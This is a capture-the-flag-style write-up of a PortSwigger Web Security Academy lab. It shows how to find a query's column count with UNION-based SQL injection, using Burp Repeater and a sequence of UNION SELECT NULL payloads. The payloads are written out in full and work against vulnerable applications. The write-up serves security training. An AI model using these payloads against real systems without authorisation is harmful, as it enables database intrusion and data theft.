# PortSwigger Web Security Academy — SQL Injection UNION Attack

## Determining the Number of Columns Returned by the Query

**Date:** 25 September 2026
**Platform:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Lab:** SQL injection UNION attack, determining the number of columns returned by the query
**Difficulty:** Apprentice
**Tool Used:** Burp Suite

---

## 1. Lab Overview

This lab contains a SQL injection vulnerability in the product category filter.

The application is vulnerable because user-controlled input from the `category` parameter is included in a SQL query without being properly protected.

The objective of this lab is to use a **SQL injection UNION attack** to determine the number of columns returned by the original SQL query.

We are not extracting usernames, passwords, or other sensitive database information in this lab.

The only objective is to determine the number of columns returned by the vulnerable query.

---

## 2. What is a UNION SQL Injection?

The SQL `UNION` operator allows the results of multiple `SELECT` queries to be combined.

For example:

```sql
SELECT name, price FROM products
UNION
SELECT username, password FROM users;
```

The results from both queries are combined into one result set.

For a UNION attack to work, the two queries must satisfy two important conditions:

1. They must return the same number of columns.
2. The corresponding columns must have compatible data types.

Therefore, before using a UNION attack to extract information, we first need to determine how many columns the original query returns.

---

## 3. Lab Objective

The goal of this lab was:

> Determine the number of columns returned by the vulnerable SQL query by performing a UNION attack that produces an additional row containing `NULL` values.

The vulnerable parameter was:

```text
category
```

Sensitive lab information such as the lab URL or identifier has intentionally been replaced with a placeholder.

---

## 4. Lab Environment

```text
Target:
[PORTSWIGGER_LAB_URL]

Lab ID:
[LAB_ID]

Vulnerable Parameter:
category

Tool:
Burp Suite

Date:
25 September 2026
```

---

# 5. Initial Reconnaissance

I opened the PortSwigger lab and navigated through the product categories.

The application contained a category filter with options such as:

```text
Accessories
Corporate gifts
Food & Drink
Tech gifts
Toys & Games
```

The category was passed to the server through the `category` parameter.

An example of the normal request was:

```http
GET /filter?category=Accessories HTTP/2
Host: [LAB_DOMAIN]
```

The important parameter was:

```text
category=Accessories
```

This was the parameter selected for testing.

---

# 6. Intercepting the Request with Burp Suite

I used **Burp Suite** to intercept the request.

### Steps

1. Open Burp Suite.
2. Go to **Proxy → Intercept**.
3. Turn interception on.
4. Open the lab in the browser.
5. Select a product category.
6. Capture the HTTP request.
7. Send the request to **Repeater**.

Repeater was used because it allows the same request to be modified and sent repeatedly.

This makes testing different SQL injection payloads much easier.

---

# 7. Understanding the Injection Point

The original request contained:

```text
category=Accessories
```

Conceptually, the application's SQL query could look something like:

```sql
SELECT [columns]
FROM products
WHERE category = 'Accessories';
```

The exact SQL query is not visible to us.

We therefore need to determine how many columns its `SELECT` statement returns.

---

# 8. Testing the First UNION Payload

I first modified the `category` parameter to:

```text
'+UNION+SELECT+NULL--
```

The payload is:

```sql
' UNION SELECT NULL--
```

### Purpose

This attempts to append a `SELECT` statement containing **one column**.

The `NULL` value is used as a placeholder because we do not yet know the data types of the original columns.

The `--` is used to comment out the remainder of the original SQL query.

### Result

The application returned an error.

This indicated that a UNION query containing only one column did not match the number of columns returned by the original query.

Therefore:

```text
1 column → Incorrect
```

---

# 9. Testing Two Columns

I then changed the payload to:

```text
'+UNION+SELECT+NULL,NULL--
```

SQL representation:

```sql
' UNION SELECT NULL,NULL--
```

This attempts to create a UNION query containing two columns.

### Result

The request still produced an error.

Therefore:

```text
2 columns → Incorrect
```

---

# 10. Testing Three Columns

I then added another `NULL` value:

```text
'+UNION+SELECT+NULL,NULL,NULL--
```

SQL representation:

```sql
' UNION SELECT NULL,NULL,NULL--
```

This time the response was successful.

The response returned:

```text
HTTP/2 200 OK
```

and the page displayed the injected category value:

```text
' UNION SELECT NULL,NULL,NULL--
```

There was no SQL column-count error.

This confirmed that the UNION query matched the number of columns returned by the original query.

---

# 11. Why Three NULL Values Worked

The testing sequence was:

```text
1 NULL
   ↓
Error

2 NULLs
   ↓
Error

3 NULLs
   ↓
Successful
```

This means:

```text
Original query → 3 columns
Injected query → 3 columns
```

Therefore, the UNION operation was accepted.

The conclusion is:

> **The original SQL query returns 3 columns.**

---

# 12. Why NULL Was Used

At this stage, the data types of the original columns were unknown.

For example, the query could potentially return:

```text
Column 1 → String
Column 2 → Number
Column 3 → String
```

We don't know this yet.

Using actual values would require guessing the correct data types.

Instead, I used:

```sql
NULL
```

because `NULL` is generally compatible with many SQL data types.

Therefore:

```sql
UNION SELECT NULL,NULL,NULL
```

is a useful way to test the number of columns without having to know their data types first.

---

# 13. Why the Number of Columns Must Match

Suppose the original query returns:

```text
Column 1
Column 2
Column 3
```

That means the result has three columns.

A UNION query such as:

```sql
SELECT NULL,NULL
```

only returns two columns.

Therefore:

```text
Original query:   3 columns
UNION query:      2 columns
```

The database cannot combine them.

However:

```sql
SELECT NULL,NULL,NULL
```

returns three columns:

```text
Original query:   3 columns
UNION query:      3 columns
```

The number of columns matches, so the UNION can execute.

---

# 14. Understanding the `--` Comment

The payload ended with:

```sql
--
```

For example:

```sql
' UNION SELECT NULL,NULL,NULL--
```

The comment marker causes the remainder of the original SQL statement to be treated as a comment in the relevant SQL syntax.

This helps prevent the rest of the application's original query from interfering with the injected SQL.

---

# 15. Final Payload

The successful payload was:

```sql
' UNION SELECT NULL,NULL,NULL--
```

URL-encoded/form-encoded representation used in the request:

```text
'+UNION+SELECT+NULL,NULL,NULL--
```

---

# 16. Final Result

The successful request returned:

```http
HTTP/2 200 OK
```

The response no longer showed the error produced by the earlier payloads.

The successful three-`NULL` UNION demonstrated that the original query contains:

```text
3 columns
```

### Final conclusion

```text
Number of columns returned by the original query = 3
```

---

# 17. Complete Attack Flow

The complete process was:

```text
Open PortSwigger Lab
        ↓
Identify category parameter
        ↓
Intercept request with Burp Suite
        ↓
Send request to Repeater
        ↓
Test UNION SELECT with 1 NULL
        ↓
Error
        ↓
Test UNION SELECT with 2 NULLs
        ↓
Error
        ↓
Test UNION SELECT with 3 NULLs
        ↓
Successful response
        ↓
Determine that original query returns 3 columns
```

---

# 18. Commands / Payloads Used

### Payload 1 — One column

```sql
' UNION SELECT NULL--
```

**Result:** Error

---

### Payload 2 — Two columns

```sql
' UNION SELECT NULL,NULL--
```

**Result:** Error

---

### Payload 3 — Three columns

```sql
' UNION SELECT NULL,NULL,NULL--
```

**Result:** Successful

---

# 19. Key Concepts Learned

### UNION

Combines the results of multiple `SELECT` queries.

### NULL

Used as a safe placeholder when the data type of a column is unknown.

### Column count

The number of columns returned by the original query must match the number of columns in the injected UNION query.

### SQL comments

The `--` syntax can be used to comment out the remaining portion of the original SQL statement.

### Burp Repeater

Useful for repeatedly modifying and testing HTTP requests during security testing.

---

# 20. What I Learned

In this lab, I learned how to determine the number of columns returned by a vulnerable SQL query using a UNION SQL injection technique.

I first tested:

```sql
' UNION SELECT NULL--
```

which resulted in an error.

I then increased the number of `NULL` values:

```sql
' UNION SELECT NULL,NULL--
```

which also resulted in an error.

Finally, I tested:

```sql
' UNION SELECT NULL,NULL,NULL--
```

which succeeded.

From this, I determined that the original query returns **three columns**.

This is an important first step for UNION-based SQL injection because the number of columns must be known before attempting to retrieve information from another database table.

---

